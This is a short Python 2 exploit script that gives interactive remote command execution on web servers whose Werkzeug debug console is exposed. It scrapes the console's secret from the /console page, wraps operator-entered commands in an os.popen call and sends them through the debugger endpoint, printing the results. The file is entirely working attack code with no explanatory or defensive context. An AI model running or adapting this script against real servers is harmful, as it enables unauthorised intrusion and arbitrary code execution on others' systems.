#!/usr/bin/env python

import requests
import sys
import re
import urllib
from bs4 import BeautifulSoup


if len(sys.argv) != 2:
    print "USAGE: python2 %s <ip/domainname> <cmd>" % (sys.argv[0])
    sys.exit(-1)

response = requests.get('http://%s/console' % (sys.argv[1]))

if "Werkzeug " not in response.text:
    print "[-] Debug is not enabled"
    sys.exit(-1)
cmd=raw_input("Enter command to execute: ")

while(cmd!='quit'):
 finalcmd = '''__import__('os').popen(\'%s\').read();''' % cmd
 response = requests.get('http://%s/console' % (sys.argv[1]))
 secret = re.findall("[0-9a-zA-Z]{20}",response.text)

 if len(secret) != 1:
     print "[-] Impossible to get SECRET"
     sys.exit(-1)
 else:
     secret = secret[0]
     print "[+] SECRET is: "+str(secret)

 print "[+] Executing '%s' on %s" % (cmd,sys.argv[1])

 response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" %(sys.argv[1],str(finalcmd),secret))
 src=BeautifulSoup(response.content,"html.parser")
 val=src.find('span')
 print "status code: " + str(response.status_code)
 print "\n--------------------OUTPUT-------------------\n"+ str(val.text)
 print "----------------------------------------------\n"
 cmd=raw_input("\n\nEnter command to execute: ")
